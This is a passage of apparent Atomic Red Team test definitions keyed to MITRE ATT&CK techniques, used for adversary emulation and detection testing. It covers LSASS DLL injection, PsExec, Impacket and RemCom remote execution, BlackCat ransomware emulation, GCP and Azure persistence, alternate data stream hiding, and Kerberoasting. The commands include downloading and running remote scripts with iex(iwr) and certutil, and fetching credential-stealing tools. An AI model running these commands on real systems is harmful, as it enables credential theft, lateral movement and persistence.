and a value will contain the path to the DLL. \nReference: https://blog.xpnsec.com/exploring-mimikatz-part-1/ and source https://github.com/oxfemale/LogonCredentialsSteal\nNote that if any LSA based protection is enabled, this will most likely not be successful with LSASS.exe loading the DLL.\n", "supported_platforms": ["windows"], "input_arguments": {"dll_path": {"description": "Module to be loaded into LSASS", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\lsass_lib.dll"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "lsass_lib.dll must exist on disk at specified location (#{dll_path})\n", "prereq_command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/oxfemale/LogonCredentialsSteal/raw/53e74251f397ddeab2bd1348c3ff26d702cfd836/lsass_lib/x64/Release/lsass_lib.dll\" -UseBasicParsing -OutFile \"#{dll_path}\"\n"}], "executor": {"command": "New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"#{dll_path}\"\n", "cleanup_command": "Remove-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\" -Name \"LsaDbExtPt\" -ErrorAction Ignore | Out-Null\n", "name": "powershell", "elevation_required": true}}]}, "T1569.002": {"name": "Service Execution", "technique_id": "attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4", "external_id": "T1569.002", "data_components": ["Process Creation", "Service Creation", "Command Execution", "Windows Registry Key Modification"], "kill_chain_phases": ["execution"], "data_source_platforms": [], "mitigations": ["course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).\n\n[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.", "atomic_tests": [{"name": "Execute a Command as a Service", "auto_generated_guid": "2382dee2-a75f-49aa-9378-f52df6ed3fb1", "description": "Creates a service specifying an arbitrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.\n\nUpon successful execution, cmd.exe creates a new service using sc.exe that will start powershell.exe to create a new file `art-marker.txt`\n\n[BlackCat Ransomware (ALPHV)](https://www.varonis.com/blog/blackcat-ransomware)  \n[Cybereason vs. BlackCat Ransomware](https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware)\n", "supported_platforms": ["windows"], "input_arguments": {"service_name": {"description": "Name of service to create", "type": "string", "default": "ARTService"}, "executable_command": {"description": "Command to execute as a service", "type": "string", "default": "%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt"}}, "executor": {"command": "sc.exe create #{service_name} binPath= \"#{executable_command}\"\nsc.exe start #{service_name}\nsc.exe delete #{service_name}\n", "cleanup_command": "del C:\\art-marker.txt >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Use PsExec to execute a command on a remote host", "auto_generated_guid": "873106b7-cfed-454b-8680-fa9f6400431c", "description": "Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments\nWill start a process on a remote host.\n\nUpon successful execution, cmd will utilize psexec.exe to spawn calc.exe on a remote endpoint (default:localhost).\n", "supported_platforms": ["windows"], "input_arguments": {"remote_host": {"description": "Remote hostname or IP address", "type": "string", "default": "localhost"}, "user_name": {"description": "Username", "type": "string", "default": "DOMAIN\\Administrator"}, "password": {"description": "Password", "type": "string", "default": "P@ssw0rd1"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "PsExec tool from Sysinternals must exist in the ExternalPayloads directory\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") { exit 0} else { exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n"}], "executor": {"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{remote_host} -u #{user_name} -p #{password} -accepteula \"C:\\Windows\\System32\\calc.exe\"\n", "name": "command_prompt"}}, {"name": "psexec.py (Impacket)", "auto_generated_guid": "edbcd8c9-3639-4844-afad-455c91e95a35", "description": "Will execute a command on the remote host with Impacket psexec.py script.\n", "supported_platforms": ["linux"], "input_arguments": {"remote_host": {"description": "Remote hostname or IP address", "type": "string", "default": "127.0.0.1"}, "username": {"description": "Username", "type": "string", "default": "Administrator"}, "domain": {"description": "Target domain", "type": "string", "default": ""}, "password": {"description": "Password", "type": "string", "default": "P@ssw0rd1"}, "command": {"description": "Command to execute in target computer", "type": "string", "default": "whoami"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "psexec.py (Impacket)\n", "prereq_command": "if [ -x \"$(command -v psexec.py)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "sudo pip3 install impacket\n"}], "executor": {"command": "psexec.py '#{domain}/#{username}:#{password}@#{remote_host}' '#{command}'\n", "name": "bash"}}, {"name": "BlackCat pre-encryption cmds with Lateral Movement", "auto_generated_guid": "31eb7828-97d7-4067-9c1e-c6feb85edc4b", "description": "This atomic attempts to emulate the unique behavior of BlackCat ransomware prior to encryption and during Lateral Movement attempts via PsExec on Windows. Uses bundled PsExec like BlackCat", "supported_platforms": ["windows"], "input_arguments": {"targethost": {"description": "Target hostname to attempt psexec connection to for emulation of lateral movement.", "type": "string", "default": "$ENV:COMPUTERNAME"}}, "dependencies": [{"description": "PsExec must exist on disk at \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\"\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n"}], "executor": {"command": "cmd.exe /c \"wmic \tcsproduct \tget UUID\" \ncmd.exe /c \"fsutil behavior \tset SymlinkEvaluation R2L:1\" \ncmd.exe /c \"fsutil behavior set \tSymlinkEvaluation R2R:1\"\nreg    add    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      \ncopy \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" $env:temp\ncmd.exe /c \"$env:temp\\psexec.exe  -accepteula  \\\\#{targethost} cmd.exe  /c echo \"--access-token\"\"\n", "cleanup_command": "reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v MaxMpxCt /f\ncmd.exe /c \"fsutil behavior set SymlinkEvaluation R2L:0\" \ncmd.exe /c \"fsutil behavior set SymlinkEvaluation R2R:0\"\nrm $env:temp\\psexec.exe\n", "name": "powershell", "elevation_required": true}}, {"name": "Use RemCom to execute a command on a remote host", "auto_generated_guid": "a5d8cdeb-be90-43a9-8b26-cc618deac1e0", "description": "Requires having RemCom installed, path to RemCom is one of the input input_arguments\nWill start a process on a remote host.\nUpon successful execution, cmd will utilize RemCom.exe to spawn calc.exe on a remote endpoint (default:localhost).\n", "supported_platforms": ["windows"], "input_arguments": {"remote_host": {"description": "Remote hostname or IP address", "type": "string", "default": "localhost"}, "user_name": {"description": "Username", "type": "string", "default": "Administrator"}, "password": {"description": "Password", "type": "string", "default": "P@ssw0rd1"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "RemCom tool must exist on disk in the ExternalPayloads folder\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\remcom.exe\") { exit 0} else { exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/kavika13/RemCom/raw/master/bin/Release/RemCom.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\remcom.exe\"\n"}], "executor": {"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\remcom.exe\" \\\\#{remote_host} /user:#{user_name} /pwd:#{password} cmd.exe\n", "name": "command_prompt"}}, {"name": "Snake Malware Service Create", "auto_generated_guid": "b8db787e-dbea-493c-96cb-9272296ddc49", "description": "The following Atomic Test will create a new service named WerFaultSvc with a binary path of WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe.\nThis was recently seen in the Snake Malware report. \nUpon execution, sc.exe will create a new service named WerFaultSvc with a bin path \\WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe and a display name of WerFault Service.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n", "supported_platforms": ["windows"], "executor": {"command": "sc.exe create \"WerFaultSvc\" binPath= \"$env:windir\\WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe\" DisplayName= \"WerFault Service\" start= auto\n", "cleanup_command": "sc.exe delete \"WerFaultSvc\"\n", "name": "command_prompt", "elevation_required": true}}]}, "T1078.004": {"name": "Cloud Accounts", "technique_id": "attack-pattern--f232fa7a-025c-4d43-abc7-318e81a73d65", "external_id": "T1078.004", "data_components": ["Logon Session Metadata", "Logon Session Creation", "User Account Authentication"], "kill_chain_phases": ["defense-evasion", "persistence", "privilege-escalation", "initial-access"], "data_source_platforms": [], "mitigations": ["course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a", "course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0", "course-of-action--e3388c78-2a8d-47c2-8422-c1398b324462", "course-of-action--f9f9e6ef-bc0a-41ad-ba11-0924e5e84c4c"], "description": "Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management systems, such as Windows Active Directory.(Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)\n\nCompromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases. Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a [Trusted Relationship](https://attack.mitre.org/techniques/T1199). Similar to [Domain Accounts](https://attack.mitre.org/techniques/T1078/002), compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.\n\nOnce a cloud account is compromised, an adversary may perform [Account Manipulation](https://attack.mitre.org/techniques/T1098) - for example, by adding [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) - to maintain persistence and potentially escalate their privileges.", "atomic_tests": [{"name": "Creating GCP Service Account and Service Account Key", "auto_generated_guid": "9fdd83fd-bd53-46e5-a716-9dec89c8ae8e", "description": "GCP Service Accounts can be used to gain intial access as well as maintain persistence inside Google Cloud.\n", "supported_platforms": ["google-workspace", "iaas:gcp"], "input_arguments": {"project-id": {"description": "ID of the project, you want to create service account as well as service account key for", "type": "string", "default": "art-project-1"}, "service-account-name": {"description": "Name of the service account", "type": "string", "default": "gcp-art-service-account-1"}, "service-account-email": {"description": "Email of the service account", "type": "string", "default": "gcp-art-service-account-1@art-project-1.iam.gserviceaccount.com"}, "output-key-file": {"description": "Email of the service account", "type": "string", "default": "gcp-art-service-account-1.json"}}, "executor": {"name": "sh", "elevation_required": false, "command": "gcloud config set project #{project-id}\ngcloud iam service-accounts create #{service-account-name}\ngcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}\n", "cleanup_command": "gcloud iam service-accounts delete #{service-account-email} --quiet\n"}, "dependency_executor_name": "sh", "dependencies": [{"description": "Requires gcloud\n", "prereq_command": "if [ -x \"$(command -v gcloud)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "echo \"Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install\"\n"}, {"description": "Check if user is logged in \n", "prereq_command": "gcloud config get-value account\n", "get_prereq_command": "gcloud auth login --no-launch-browser\n"}]}, {"name": "Azure Persistence Automation Runbook Created or Modified", "auto_generated_guid": "348f4d14-4bd3-4f6b-bd8a-61237f78b3ac", "description": "Identifies when an Azure Automation runbook is created or modified. An adversary may create or modify an Azure\nAutomation runbook to execute malicious code and maintain persistence in their target's environment.\n", "supported_platforms": ["iaas:azure"], "input_arguments": {"username": {"description": "Azure username", "type": "string", "default": null}, "password": {"description": "Azure password", "type": "string", "default": null}, "resource_group": {"description": "Name of the resource group", "type": "string", "default": null}, "runbook_name": {"description": "Name of the runbook name", "type": "string", "default": null}, "automation_account_name": {"description": "Name of the automation account name", "type": "string", "default": null}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Check if terraform is installed.\n", "prereq_command": "terraform version\n", "get_prereq_command": "echo Please install terraform.\n"}, {"description": "Install-Module -Name Az\n", "prereq_command": "try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n", "get_prereq_command": "Install-Module -Name Az -Scope CurrentUser -Force\n"}, {"description": "Check if the user is logged into Azure.\n", "prereq_command": "az account show\n", "get_prereq_command": "echo Configure your Azure account using: az login. \n"}, {"description": "Create dependency resources using terraform\n", "prereq_command": "try {if (Test-Path \"$PathToAtomicsFolder/T1078.004/src/T1078.004-2/terraform.tfstate\" ){ exit 0 } else {exit 1}} catch {exit 1}\n", "get_prereq_command": "cd \"$PathToAtomicsFolder/T1078.004/src/T1078.004-2/\"\nterraform init\nterraform apply -auto-approve\n"}], "executor": {"command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-AzAccount -Credential $creds\nNew-AzAutomationRunbook -Name #{runbook_name} -Type PowerShell -ResourceGroupName #{resource_group} -Description 'my-test-runbook' -AutomationAccountName #{automation_account_name}\n", "name": "powershell", "elevation_required": false, "cleanup_command": "Remove-AzAutomationRunbook -AutomationAccountName #{automation_account_name} -Name #{runbook_name} -ResourceGroupName #{resource_group} -Force\ncd \"$PathToAtomicsFolder/T1078.004/src/T1078.004-2/\"\nterraform destroy -auto-approve\n"}}, {"name": "GCP - Create Custom IAM Role", "auto_generated_guid": "3a159042-69e6-4398-9a69-3308a4841c85", "description": "This atomic will create a new IAM role. The default role permissions are: *IAM Service Account Get*. The idea for this Atomic came from a Rule published by the Elastic team.\n\nIdentifies an Identity and Access Management (IAM) custom role creation in Google Cloud Platform (GCP). \nCustom roles are user-defined, and allow for the bundling of one or more supported permissions to meet specific needs. \nCustom roles will not be updated automatically and could lead to privilege creep if not carefully scrutinized.\n\nThis atomic will create a new IAM role. The default role permissions are: *IAM Service Account Get*\n\nReference: https://github.com/elastic/detection-rules/blob/main/rules/integrations/gcp/initial_access_gcp_iam_custom_role_creation.toml\n", "supported_platforms": ["iaas:gcp"], "input_arguments": {"project-id": {"description": "ID of the GCP Project you to execute the command against.", "type": "string", "default": "atomic-test-1"}, "role-name": {"description": "The name of the role to be created.", "type": "string", "default": "AtomicRedTeamRole"}, "role-description": {"description": "The description of the role to be created.", "type": "string", "default": "Atomic Red Team Custom IAM Role"}, "roles": {"description": "List of roles to be applied", "type": "string", "default": "iam.serviceAccounts.get"}}, "executor": {"name": "sh", "elevation_required": false, "command": "gcloud config set project #{project-id}\ngcloud iam roles create #{role-name} --description=\"#{role-description}\" --permissions=#{roles} --project=#{project-id}\n", "cleanup_command": "gcloud iam roles delete #{role-name} --project=#{project-id}\n"}, "dependency_executor_name": "sh", "dependencies": [{"description": "Requires gcloud\n", "prereq_command": "if [ -x \"$(command -v gcloud)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "echo \"Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install\"\n"}, {"description": "Check if user is logged in \n", "prereq_command": "gcloud config get-value account\n", "get_prereq_command": "gcloud auth login --no-launch-browser\n"}]}]}, "T1564.004": {"name": "NTFS File Attributes", "technique_id": "attack-pattern--f2857333-11d4-45bf-b064-2c28d8525be5", "external_id": "T1564.004", "data_components": ["Command Execution", "File Modification", "File Metadata", "OS API Execution"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--987988f0-cf86-4680-a875-2f6456ab2448"], "description": "Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)\n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)", "atomic_tests": [{"name": "Alternate Data Streams (ADS)", "auto_generated_guid": "8822c3b0-d9f9-4daf-a043-49f4602364f4", "description": "Execute from Alternate Streams\n\n[Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)\n\n[Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)\n", "supported_platforms": ["windows"], "input_arguments": {"path": {"description": "Path of ADS file", "type": "path", "default": "c:\\ADS\\"}}, "executor": {"command": "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32 #{path}\\procexp.cab #{path}\\file.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump #{path}\\procexp.exe > #{path}\\file.txt:procexp.exe\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\temp:ttt\nmakecab #{path}\\autoruns.exe #{path}\\cabtest.txt:autoruns.cab\nprint /D:#{path}\\file.txt:autoruns.exe #{path}\\Autoruns.exe\nreg export HKLM\\SOFTWARE\\Microsoft\\Evilreg #{path}\\file.txt:evilreg.reg\nregedit /E #{path}\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey\nexpand \\\\webdav\\folder\\file.bat #{path}\\file.txt:file.bat\nesentutl.exe /y #{path}\\autoruns.exe /d #{path}\\file.txt:autoruns.exe /o \n", "name": "command_prompt", "elevation_required": true}}, {"name": "Store file in Alternate Data Stream (ADS)", "auto_generated_guid": "2ab75061-f5d5-4c1a-b666-ba2a50df5b02", "description": "Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.\nUpon execution cmd will run and attempt to launch desktop.ini. No windows remain open after the test\n", "supported_platforms": ["windows"], "input_arguments": {"payload_path": {"description": "Path of file to hide in ADS", "type": "path", "default": "c:\\windows\\system32\\cmd.exe"}, "ads_file_path": {"description": "Path of file to create an ADS under", "type": "path", "default": "C:\\Users\\Public\\Libraries\\yanki\\desktop.ini"}, "ads_name": {"description": "Name of ADS", "type": "string", "default": "desktop.ini"}}, "executor": {"command": "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n    New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n    }\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,#{payload_path},>,`\"#{ads_file_path}:#{ads_name}`\"\"\n", "cleanup_command": "Remove-Item \"#{ads_file_path}\" -Force -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Create ADS command prompt", "auto_generated_guid": "17e7637a-ddaf-4a82-8622-377e20de8fdb", "description": "Create an Alternate Data Stream with the command prompt. Write access is required. Upon execution, run \"dir /a-d /s /r | find \":$DATA\"\" in the %temp%\nfolder to view that the alternate data stream exists. To view the data in the alternate data stream, run \"notepad T1564.004_has_ads.txt:adstest.txt\"\n", "supported_platforms": ["windows"], "input_arguments": {"file_name": {"description": "File name of file to create ADS on.", "type": "string", "default": "%temp%\\T1564.004_has_ads_cmd.txt"}, "ads_filename": {"description": "Name of ADS.", "type": "string", "default": "adstest.txt"}}, "executor": {"command": "echo cmd /c echo \"Shell code execution.\"> #{file_name}:#{ads_filename}\nfor /f \"usebackq delims=?\" %i in (#{file_name}:#{ads_filename}) do %i\n", "cleanup_command": "del #{file_name} >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Create ADS PowerShell", "auto_generated_guid": "0045ea16-ed3c-4d4c-a9ee-15e44d1560d1", "description": "Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, the the command \"ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname\"\nin the %temp% direcotry to view all files with hidden data streams. To view the data in the alternate data stream, run \"notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt\" in the %temp% folder.\n", "supported_platforms": ["windows"], "input_arguments": {"file_name": {"description": "File name of file to create ADS on.", "type": "string", "default": "$env:TEMP\\T1564.004_has_ads_powershell.txt"}, "ads_filename": {"description": "Name of ADS file.", "type": "string", "default": "adstest.txt"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The file must exist on disk at specified location (#{file_name})\n", "prereq_command": "if (Test-Path #{file_name}) { exit 0 } else { exit 1 }\n", "get_prereq_command": "New-Item -Path #{file_name} | Out-Null\n"}], "executor": {"command": "echo \"test\" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value \"test\"\nset-content -path #{file_name} -stream #{ads_filename} -value \"test2\"\nset-content -path . -stream #{ads_filename} -value \"test3\"\n", "cleanup_command": "Remove-Item -Path #{file_name} -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Create Hidden Directory via $index_allocation", "auto_generated_guid": "3e6791e7-232c-481c-a680-a52f86b83fdf", "description": "Create an Alternate Data Stream Directory and File with the command prompt. Write access is required. Upon execution, \nrun \"dir /A /Q /R\" in the %temp% folder to view that the alternate data stream folder exists. To view the data in the  \nalternate data stream, run \"type %temp%\\...$.......::$index_allocation\\secrets.txt\"\n", "supported_platforms": ["windows"], "input_arguments": {"folder_name": {"description": "File name of file to create inside the folder.", "type": "string", "default": "%temp%\\...$.......::$index_allocation"}, "hidden_filename": {"description": "Name of the files containing the hidden information", "type": "string", "default": "secrets.txt"}}, "executor": {"command": "md #{folder_name}\necho too many secrets > #{folder_name}\\#{hidden_filename}\n", "cleanup_command": "rmdir /S /Q #{folder_name} >nul 2>&1\n", "name": "command_prompt"}}]}, "T1558.003": {"name": "Kerberoasting", "technique_id": "attack-pattern--f2877f7f-9a4c-4251-879f-1224e3006bee", "external_id": "T1558.003", "data_components": ["Active Directory Credential Request"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--feff9142-e8c2-46f4-842b-bd6fb3d41157"], "description": "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\n\nThis same behavior could be executed using service tickets captured from cyberwheel.network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)", "atomic_tests": [{"name": "Request for service tickets", "auto_generated_guid": "3f987809-3681-43c8-bcd8-b3ff3a28533a", "description": "This test uses the Powershell Empire Module: Invoke-Kerberoast.ps1\nThe following are further sources and credits for this attack:\n[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\nwhen executed successfully , the test displays available services with their hashes. \nIf the testing domain doesn't have any service principal name configured, there is no output\n", "supported_platforms": ["windows"], "dependencies": [{"description": "Computer must be domain joined\n", "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"}], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)\nInvoke-Kerberoast | fl\n", "name": "powershell"}}, {"name": "Rubeus kerberoast", "auto_generated_guid": "14625569-6def-4497-99ac-8e7817105b55", "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n", "supported_platforms": ["windows"], "input_arguments": {"local_folder": {"description": "Local path of Rubeus executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads"}, "local_executable": {"description": "name of the rubeus executable", "type": "string", "default": "rubeus.exe"}, "out_file": {"description": "file where command results are stored", "type": "string", "default": "rubeus_output.txt"}, "rubeus_url": {"description": "URL of Rubeus executable", "type": "url", "default": "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe"}, "flags": {"description": "command flags you would like to run (optional and blank by default)", "type": "string", "default": null}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Computer must be domain joined\n", "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"}, {"description": "Rubeus must exist\n", "prereq_command": "if(Test-Path -Path \"#{local_folder}\\#{local_executable}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | 